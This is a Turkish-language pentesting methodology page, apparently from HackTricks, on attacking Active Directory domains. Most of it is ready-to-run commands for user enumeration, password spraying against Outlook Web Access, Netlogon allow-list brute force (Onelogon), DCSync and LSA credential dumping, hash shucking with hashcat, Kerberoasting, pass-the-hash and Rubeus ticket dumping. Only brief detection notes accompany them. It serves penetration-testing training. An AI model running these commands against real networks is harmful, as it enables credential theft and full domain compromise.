# Active Directory Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Temel genel bakış

**Active Directory**, **ağ yöneticilerinin** bir ağ içerisindeki **etki alanlarını**, **kullanıcıları** ve **nesneleri** verimli bir şekilde oluşturup yönetmesini sağlayan temel bir teknolojidir. Yönetilebilir **gruplar** ve **alt gruplar** içerisinde çok sayıda kullanıcının düzenlenmesini kolaylaştıracak şekilde ölçeklenmek üzere tasarlanmıştır ve farklı seviyelerdeki **erişim haklarını** kontrol eder.

**Active Directory** yapısı üç temel katmandan oluşur: **etki alanları**, **ağaçlar** ve **ormanlar**. Bir **etki alanı**, ortak bir veritabanını paylaşan **kullanıcılar** veya **cihazlar** gibi nesnelerden oluşur. **Ağaçlar**, ortak bir yapı aracılığıyla birbirine bağlanan bu etki alanı gruplarıdır ve bir **orman**, **güven ilişkileri** üzerinden birbirine bağlanan birden fazla ağacın koleksiyonunu temsil eder; bu, organizasyon yapısının en üst katmanıdır. Belirli **erişim** ve **iletişim hakları** bu seviyelerin her birinde atanabilir.

**Active Directory** içerisindeki temel kavramlar şunlardır:

1. **Dizin** – Active Directory nesneleriyle ilgili tüm bilgileri barındırır.
2. **Nesne** – **kullanıcılar**, **gruplar** veya **paylaşılan klasörler** dahil olmak üzere dizin içerisindeki varlıkları ifade eder.
3. **Etki alanı** – Dizin nesneleri için bir kapsayıcı görevi görür. Bir **orman** içerisinde birden fazla etki alanı bulunabilir ve her biri kendi nesne koleksiyonunu barındırır.
4. **Ağaç** – Ortak bir kök etki alanını paylaşan etki alanlarının grubudur.
5. **Orman** – Active Directory'deki organizasyon yapısının zirvesidir ve aralarında **güven ilişkileri** bulunan çeşitli ağaçlardan oluşur.

**Active Directory Domain Services (AD DS)**, bir ağ içerisindeki merkezi yönetim ve iletişim için kritik olan çeşitli hizmetleri kapsar. Bu hizmetler şunlardır:

1. **Etki Alanı Hizmetleri** – Veri depolamayı merkezileştirir ve **kullanıcılar** ile **etki alanları** arasındaki etkileşimleri yönetir; **kimlik doğrulama** ve **arama** işlevlerini de kapsar.
2. **Sertifika Hizmetleri** – Güvenli **dijital sertifikaların** oluşturulmasını, dağıtımını ve yönetimini denetler.
3. **Lightweight Directory Services** – **LDAP protokolü** aracılığıyla dizin özellikli uygulamaları destekler.
4. **Directory Federation Services** – Tek bir oturumda kullanıcıların birden fazla web uygulamasında kimlik doğrulaması yapabilmesi için **single-sign-on** özellikleri sağlar.
5. **Rights Management** – Telif hakkıyla korunan materyallerin izinsiz dağıtımını ve kullanımını düzenleyerek korunmasına yardımcı olur.
6. **DNS Service** – **etki alanı adlarının** çözümlenmesi için kritik öneme sahiptir.

Daha ayrıntılı bir açıklama için şuraya bakın: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Bir **AD'yi saldırmak** için **Kerberos kimlik doğrulama sürecini** gerçekten iyi **anlamanız** gerekir.\
[**Hâlâ nasıl çalıştığını bilmiyorsanız bu sayfayı okuyun.**](kerberos-authentication.md)

## Cheat Sheet

Bir AD'yi enumerate/exploit etmek için çalıştırabileceğiniz komutlara hızlıca göz atmak üzere [https://wadcoms.github.io/](https://wadcoms.github.io) adresini kullanabilirsiniz.

> [!WARNING]
> Eylemleri gerçekleştirmek için Kerberos iletişimi **tam nitelikli bir ad (FQDN)** gerektirir. Bir makineye IP adresiyle erişmeye çalışırsanız **Kerberos yerine NTLM kullanılır**.

## Recon Active Directory (No creds/sessions)

Bir AD ortamına erişiminiz varsa ancak herhangi bir kimlik bilginiz/oturumunuz yoksa şunları yapabilirsiniz:

- **Ağı pentest edin:**
- Ağı tarayın, makineleri ve açık portları bulun; ardından **zafiyetleri exploit etmeyi** veya bu makinelerden **kimlik bilgilerini çıkarmayı** deneyin (örneğin, [yazıcılar oldukça ilginç hedefler olabilir](ad-information-in-printers.md).
- DNS'i enumerate etmek; web, yazıcılar, paylaşımlar, VPN, medya vb. gibi etki alanındaki önemli sunucular hakkında bilgi sağlayabilir.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Bunun nasıl yapılacağı hakkında daha fazla bilgi edinmek için Genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) sayfasına göz atın.
- **SMB servislerinde null ve Guest erişimini kontrol edin** (bu, modern Windows sürümlerinde çalışmaz):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bir SMB sunucusunun nasıl enumerate edileceğine ilişkin daha ayrıntılı bir rehber burada bulunabilir:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP'yi enumerate edin**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP'nin nasıl enumerate edileceğine ilişkin daha ayrıntılı bir rehber burada bulunabilir (özellikle **anonim erişime** dikkat edin):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Ağı zehirleyin**
- [**Responder ile servisleri taklit ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) kimlik bilgilerini toplayın
- [**Relay attack'i kötüye kullanarak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host'a erişin
- [**evil-S ile sahte UPnP servislerini açığa çıkararak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) kimlik bilgilerini toplayın
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Dahili belgelerden, sosyal medyadan ve etki alanı ortamları içerisindeki servislerden (özellikle web) kullanıcı adlarını/adları; ayrıca kamuya açık kaynaklardan da çıkarın.
- Şirket çalışanlarının tam adlarını bulursanız farklı AD **kullanıcı adı kurallarını (**[**bunu okuyun**](https://activedirectorypro.com/active-directory-user-naming-convention/)) deneyebilirsiniz. En yaygın kurallar şunlardır: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _rastgele harf ve 3 rastgele rakam_ (abc123).
- Araçlar:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute enum**: **geçersiz bir kullanıcı adı istendiğinde** sunucu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos hata kodunu** döndürür ve bu da kullanıcı adının geçersiz olduğunu belirlememizi sağlar. **Geçerli kullanıcı adları** ya bir AS-REP yanıtında **TGT** döndürür ya da kullanıcının pre-authentication gerçekleştirmesi gerektiğini belirten _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatasını döndürür.
- **MS-NRPC'ye karşı kimlik doğrulama olmadan erişim**: Etki alanı denetleyicilerindeki MS-NRPC (Netlogon) arayüzüne karşı auth-level = 1 (Kimlik doğrulama yok) kullanılır. Bu yöntem, herhangi bir kimlik bilgisi olmadan kullanıcının veya bilgisayarın mevcut olup olmadığını kontrol etmek için MS-NRPC arayüzüne bind olduktan sonra `DsrGetDcNameEx2` işlevini çağırır. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) aracı bu tür bir enumeration işlemini uygular. Araştırmaya [buradan](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> ulaşabilirsiniz.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Sunucusu**

Ağda bu sunuculardan birini bulduysanız, buna karşı **user enumeration** da gerçekleştirebilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Kullanıcı adı listelerini [**bu github reposunda**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve bu repoda ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) bulabilirsiniz.
>
> Ancak bundan önce gerçekleştirmeniz gereken recon adımında **şirkette çalışan kişilerin adlarına** sahip olmalısınız. Ad ve soyad ile potansiyel olarak geçerli kullanıcı adları oluşturmak için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

DC üzerinde **Zerologon** patch'lenmiş olsa bile açıkça allow-list'e alınmış hesaplar **legacy/vulnerable Netlogon secure-channel davranışına** hâlâ maruz kalabilir. Riskli yapılandırma, **`Domain controller: Allow vulnerable Netlogon secure channel connections`** GPO'su veya buna karşılık gelen **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** registry değeridir.

Bu değer bir **SDDL security descriptor**'ıdır ([Security Descriptors](security-descriptors.md) bölümüne bakın). DACL içinde ilgili ACE verilen herhangi bir hesap veya grup hedef alınabilir. Örneğin, `O:BAG:BAD:(A;;RC;;;WD)` ifadesi **Everyone**'ı etkin şekilde allow-list'e alır.

Pratik operatör iş akışı:

1. **Allow-list'e alınmış principal'ları belirleyin**; hem **SYSVOL/GPO** hem de **live DC registry**'yi kontrol edin.
2. SDDL içinde bulunan **SID**'leri gerçek AD kullanıcılarına/bilgisayarlarına çözümleyin ve **DC machine account**'larına, **trust account**'larına ve diğer ayrıcalıklı makinelere öncelik verin.
3. Allow-list'e alınmış hesap olarak **MS-NRPC / Netlogon authentication** girişimlerini tekrarlayın.
4. Başarılı bir tahminden sonra hedef hesap parolasını sıfırlamak için **Netlogon password-setting** özelliğini abuse edin (public PoC bunu boş bir string olarak ayarlar).<sup>[[9]](#references)[[10]](#references)</sup>

Public artifact'tan hızlı triage / lab örnekleri:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notlar:

- **scanner**, etkin allow-list'in **SYSVOL** içinde, **registry**'de veya her ikisinde de bulunabilmesi nedeniyle kullanışlıdır.
- Exploit path'in kendisi önemlidir; çünkü savunmasız bir account belirlendikten sonra **Domain Admin privileges** gerektirmez.
- `DC$` gibi bir **Domain Controller machine account**'un ele geçirilmesi özellikle tehlikelidir; çünkü bu parolanın resetlenmesi daha geniş **AD takeover** path'lerini doğrudan etkinleştirebilir.
- **Brute-force feasibility** mode'a bağlıdır: public artifact, meet-in-the-middle yaklaşımını, başka bir computer account mevcut olduğunda **24-bit** brute force'u ve daha yavaş **32-bit** varyantlarını açıklar.

Detection / hardening notları:

- allow-list policy'yi audit edin ve geçici, açıkça gerekli compatibility exception'ları dışında her şeyi kaldırın.
- Savunmasız Netlogon connection'larının reddedildiğini, keşfedildiğini veya policy tarafından açıkça allow edildiğini yakalamak için DC **System** event'leri **5827/5828/5829/5830/5831**'i monitor edin.
- `VulnerableChannelAllowList` içindeki account'ları, legacy dependency kaldırılana kadar **high-risk** kabul edin.

### Bir veya birkaç username bilmek

Tamam, geçerli bir username'iniz olduğunu ancak hiç password'ünüz olmadığını biliyorsunuz... O halde şunları deneyin:

- [**ASREPRoast**](asreproast.md): Bir user'da _DONT_REQ_PREAUTH_ attribute'u **yoksa**, o user için user'ın password'ünden türetilen bir değerle encrypted bazı veriler içeren bir **AS_REP message** **request** edebilirsiniz.
- [**Password Spraying**](password-spraying.md): Bulduğunuz user'ların her biriyle en **common passwords**'ları deneyin; belki bir user kötü bir password kullanıyordur (password policy'yi aklınızda bulundurun!).
- User'ların mail server'larına erişim elde etmeyi denemek için **OWA servers**'a da **spray** uygulayabileceğinizi unutmayın.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**Poisoning** yaparak bazı **network** protocol'lerinden crack edilecek challenge **hashes** **obtain** edebilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory'yi enumerate etmeyi başardıysanız **daha fazla email ve network hakkında daha iyi bir anlayışa** sahip olursunuz. AD env'ine erişim elde etmek için NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) **force** edebilirsiniz.

### NetExec workspace-driven recon & relay posture checks

- Engagement başına AD recon state'ini korumak için **`nxcdb` workspaces** kullanın: `workspace create <name>`, `~/.nxc/workspaces/<name>` altında protocol başına SQLite DB'leri (smb/mssql/winrm/ldap/etc) oluşturur. `proto smb|mssql|winrm` ile görünümleri değiştirin ve toplanan secret'ları `creds` ile listeleyin. İşiniz bittiğinde sensitive data'yı manuel olarak purge edin: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** ile hızlı subnet discovery; **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini gösterir. `(signing:False)` gösteren member'lar **relay-prone**'dur; DC'ler ise genellikle signing gerektirir.
- Targeting'i kolaylaştırmak için hostname'leri doğrudan NetExec output'undan `/etc/hosts` içine oluşturun:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC**, signing nedeniyle engellense bile **LDAP** durumunu yine de probe edin: `netexec ldap <dc>`, `(signing:None)` / weak channel binding bilgilerini gösterir. SMB signing zorunlu olan ancak LDAP signing devre dışı bırakılmış bir DC, **SPN-less RBCD** gibi abuse'lar için hâlâ uygulanabilir bir **relay-to-LDAP** hedefidir.

### Client-side printer credential leak'leri → toplu domain credential doğrulaması

- Printer/web UI'ları bazen maskelenmiş admin password'lerini HTML içine gömer. Source/devtools görüntülemek cleartext bilgiyi (ör. `<input value="<password>">`) açığa çıkarabilir ve scan/print repository'lerine Basic-auth erişimi sağlayabilir.
- Alınan print job'ları, kullanıcı başına password'ler içeren **plaintext onboarding** dokümanları barındırabilir. Test sırasında pairing'leri uyumlu tutun:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

**null veya guest user** ile **diğer PC'lere veya paylaşımlara erişebiliyorsanız**, bir şekilde erişildiğinde size karşı bir NTLM authentication **t**etikleyecek** dosyaları** (SCF dosyası gibi) **yerleştirebilir**, böylece **crack etmek** üzere **NTLM challenge'ını çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**, sahip olduğunuz her NT hash'ini, anahtar materyali doğrudan NT hash'inden türetilen diğer daha yavaş formatlar için bir aday parola olarak ele alır. Kerberos RC4 ticket'larında, NetNTLM challenge'larında veya cached credentials'ta uzun passphrase'leri brute-force etmek yerine, NT hash'lerini Hashcat'in NT-candidate mode'larına vererek plaintext'i hiç öğrenmeden parola tekrar kullanımını doğrulamasını sağlarsınız. Bu yöntem, binlerce güncel ve geçmiş NT hash'ini toplayabildiğiniz bir domain compromise sonrasında özellikle etkilidir.<sup>[[5]](#references)</sup>

Şu durumlarda shucking kullanın:

- DCSync, SAM/SECURITY dump'ları veya credential vault'larından elde edilmiş bir NT corpus'unuz varsa ve başka domain/forest'larda tekrar kullanımı test etmeniz gerekiyorsa.
- RC4 tabanlı Kerberos materyali (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM response'ları veya DCC/DCC2 blob'ları yakalarsanız.
- Uzun ve crack edilemez passphrase'lerin tekrar kullanımını hızlıca kanıtlamak ve Pass-the-Hash üzerinden hemen pivot etmek istiyorsanız.

Bu technique, anahtarları NT hash'i olmayan encryption type'lara karşı **çalışmaz** (ör. Kerberos etype 17/18 AES). Bir domain yalnızca AES kullanımını zorluyorsa normal password mode'larına dönmeniz gerekir.

#### Bir NT hash corpus oluşturma

- **DCSync/NTDS** – En geniş NT hash setini (ve önceki değerlerini) almak için history ile `secretsdump.py` kullanın:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History kayıtları, Microsoft bir account için 24 adede kadar önceki hash saklayabildiğinden aday havuzunu önemli ölçüde genişletir. NTDS secrets toplamanın diğer yolları için bkz.:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dump'ları** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`), local SAM/SECURITY verilerini ve cached domain logon'larını (DCC/DCC2) çıkarır. Bu hash'leri tekilleştirin ve aynı `nt_candidates.txt` listesine ekleyin.
- **Metadata'yı takip edin** – Her hash'i üreten username/domain bilgisini koruyun (wordlist yalnızca hex içerse bile). Hashcat kazanan adayı yazdırdığında eşleşen hash'ler, hangi principal'ın parolayı tekrar kullandığını hemen gösterir.
- Aynı forest veya trusted forest içindeki adayları tercih edin; bu, shucking sırasında örtüşme olasılığını en üst düzeye çıkarır.

#### Hashcat NT-candidate mode'ları

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate input'ları **raw 32-hex NT hash'leri olarak kalmalıdır**. Rule engine'lerini devre dışı bırakın (`-r` kullanmayın ve hybrid mode'larını kullanmayın); çünkü mangling, candidate key material'ını bozar.
- Bu mode'lar doğası gereği daha hızlı değildir; ancak NTLM keyspace'i (bir M3 Max üzerinde yaklaşık 30.000 MH/s), Kerberos RC4'ten (yaklaşık 300 MH/s) yaklaşık 100 kat daha hızlıdır. Seçilmiş bir NT listesini test etmek, yavaş formatta tüm parola space'ini araştırmaktan çok daha ucuzdur.
- Her zaman **en güncel Hashcat build'ini** çalıştırın (`git clone https://github.com/hashcat/hashcat && make install`); çünkü 31500/31600/35300/35400 mode'ları yakın zamanda kullanıma sunuldu.<sup>[[7]](#references)</sup>
- Şu anda AS-REQ Pre-Auth için bir NT mode'u yoktur ve AES etype'ları (19600/19700), key'leri raw NT hash'lerinden değil UTF-16LE parolalardan PBKDF2 ile türetildiği için plaintext password gerektirir.

#### Örnek – Kerberoast RC4 (mode 35300)

1. Düşük yetkili bir user ile hedef SPN için bir RC4 TGS yakalayın (ayrıntılar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Ticket'ı NT listenizle shuck edin:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat, her NT adayından RC4 key'ini türetir ve `$krb5tgs$23$...` blob'unu doğrular. Bir eşleşme, service account'un mevcut NT hash'lerinizden birini kullandığını doğrular.

3. PtH üzerinden hemen pivot edin:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Gerekirse plaintext'i daha sonra `hashcat -m 1000 <matched_hash> wordlists/` ile kurtarabilirsiniz.

#### Örnek – Cached credentials (mode 31600)

1. Compromise edilmiş bir workstation'dan cached logon'ları dump edin:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. İlginç domain user'ına ait DCC2 satırını `dcc2_highpriv.txt` dosyasına kopyalayın ve shuck edin:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Başarılı bir eşleşme, listenizde zaten bilinen NT hash'ini verir ve cached user'ın bir parolayı tekrar kullandığını kanıtlar. Bunu doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) veya string'i kurtarmak için hızlı NTLM mode'unda brute-force edin.

Aynı workflow NetNTLM challenge-response'ları (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Bir eşleşme belirlendiğinde relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash'ini mask/rule'larla offline olarak yeniden crack edebilirsiniz.



## Credentials/session ile Active Directory Enumerating

Bu phase için geçerli bir domain account'un **credentials'ını veya session'ını compromise etmiş olmanız gerekir.** Geçerli bazı credentials'lara veya bir domain user olarak shell'e sahipseniz, **daha önce verilen seçeneklerin diğer user'ları compromise etmek için hâlâ kullanılabilir olduğunu hatırlamalısınız**.

Authenticated enumeration'a başlamadan önce **Kerberos double hop problem'inin** ne olduğunu bilmelisiniz.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Bir account'u compromise etmek, **tüm domain'i compromise etmeye başlamak için büyük bir adımdır**; çünkü **Active Directory Enumeration** işlemine başlayabilirsiniz:

[**ASREPRoast**](asreproast.md) konusunda artık vulnerable olabilecek her user'ı bulabilir, [**Password Spraying**](password-spraying.md) konusunda ise **tüm username'lerin bir listesini** elde ederek compromise edilmiş account'un parolasını, boş parolaları ve yeni promising parolaları deneyebilirsiniz.

- [**Temel recon gerçekleştirmek için CMD'yi kullanabilirsiniz**](../basic-cmd-for-pentesters.md#domain-info)
- Daha stealthy olması için [**recon amacıyla powershell de kullanabilirsiniz**](../basic-powershell-for-pentesters/index.html)
- Daha ayrıntılı bilgiler çıkarmak için [**powerview kullanabilirsiniz**](../basic-powershell-for-pentesters/powerview.md)
- Bir active directory'de recon için başka bir harika tool [**BloodHound**](bloodhound.md)'dur. **Çok stealthy değildir** (kullandığınız collection method'larına bağlı olarak); ancak **bunu önemsemiyorsanız** kesinlikle denemelisiniz. User'ların nerede RDP yapabildiğini, diğer group'lara giden path'leri vb. bulun.
- **Diğer automated AD enumeration tool'ları:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- İlginç bilgiler içerebileceklerinden [**AD'nin DNS kayıtlarını**](ad-dns-records.md) inceleyin.
- Directory'yi enumerate etmek için kullanabileceğiniz **GUI'li bir tool**, **SysInternal** Suite içindeki **AdExplorer.exe**'dir.
- Credentials'ı _userPassword_ ve _unixUserPassword_ alanlarında veya _Description_'da aramak için LDAP database'inde **ldapsearch** ile arama yapabilirsiniz. Diğer method'lar için [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) sayfasına bakın.
- **Linux** kullanıyorsanız domain'i [**pywerview**](https://github.com/the-useless-one/pywerview) ile de enumerate edebilirsiniz.
- Automated tool'ları da deneyebilirsiniz:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain user'larını çıkarma**

Windows'tan tüm domain username'lerini elde etmek çok kolaydır (`net user /domain` ,`Get-DomainUser` veya `wmic useraccount get name,sid`). Linux'ta şunları kullanabilirsiniz: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`

> Bu Enumeration bölümü küçük görünse bile tüm bölümün en önemli kısmıdır. Linklere (özellikle cmd, powershell, powerview ve BloodHound linklerine) erişin, bir domain'i nasıl enumerate edeceğinizi öğrenin ve kendinizi rahat hissedene kadar pratik yapın. Bir assessment sırasında DA'ya giden yolu bulmak veya hiçbir şey yapılamayacağına karar vermek için kritik an bu olacaktır.

### Kerberoast

Kerberoasting, user account'larına bağlı service'ler tarafından kullanılan **TGS ticket'larını** elde etmeyi ve user password'larına dayanan encryption'larını **offline** olarak crack etmeyi içerir.

Bu konuda daha fazla bilgi:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, vb.)

Bazı credentials'ları elde ettikten sonra herhangi bir **machine**'a erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için port scan'lerinize uygun şekilde farklı protocol'lerle çeşitli server'lara bağlanmayı denemek üzere **CrackMapExec** kullanabilirsiniz.

### Local Privilege Escalation

Compromise edilmiş credentials'a veya normal bir domain user olarak bir session'a sahipseniz ve bu user ile **domain'deki herhangi bir machine'a erişiminiz** varsa, **local olarak privilege escalate etmeye ve credentials toplamaya** çalışmalısınız. Bunun nedeni, yalnızca local administrator privilege'larıyla diğer user'ların hash'lerini memory'den (LSASS) ve local olarak (SAM) **dump edebilecek** olmanızdır.

Bu kitapta [**Windows'ta local privilege escalation**](../windows-local-privilege-escalation/index.html) ve bir [**checklist**](../checklist-windows-privilege-escalation.md) hakkında eksiksiz bir sayfa bulunmaktadır. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.

### Current Session Tickets

Mevcut user'a ait **ticket'larda**, size beklenmedik resource'lara **erişim izni verecek** bilgileri bulmanız çok **düşük bir ihtimaldir**; ancak şunları kontrol edebilirsiniz:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Active Directory'yi enumerate etmeyi başardıysanız **daha fazla e-posta ve network hakkında daha iyi bir anlayışa** sahip olursunuz. NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**'i zorlayabilirsiniz.**

### Computer Shares | SMB Shares İçinde Creds Arama

Artık bazı temel credential'lara sahip olduğunuza göre, **AD içinde paylaşılan ilginç dosyaları** bulup bulamayacağınızı kontrol etmelisiniz. Bunu manuel olarak yapabilirsiniz ancak bu çok sıkıcı ve tekrarlayan bir görevdir (özellikle kontrol etmeniz gereken yüzlerce doküman bulursanız).

[**Kullanabileceğiniz araçlar hakkında bilgi edinmek için bu bağlantıyı takip edin.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds Çalma

**Diğer PC'lere veya share'lere erişebiliyorsanız**, bir şekilde erişildiğinde size karşı **NTLM authentication'ı trigger edecek** dosyalar (SCF file gibi) **yerleştirebilirsiniz**; böylece crack etmek üzere **NTLM challenge'ını çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu vulnerability, authentication yapmış herhangi bir kullanıcının **domain controller'ı compromise etmesine** olanak sağlıyordu.


{{#ref}}
printnightmare.md
{{#endref}}

## Privileged credentials/session ile Active Directory üzerinde privilege escalation

**Aşağıdaki teknikler için normal bir domain user yeterli değildir; bu saldırıları gerçekleştirmek için bazı özel privilege'lara/credential'lara ihtiyacınız vardır.**

### Hash extraction

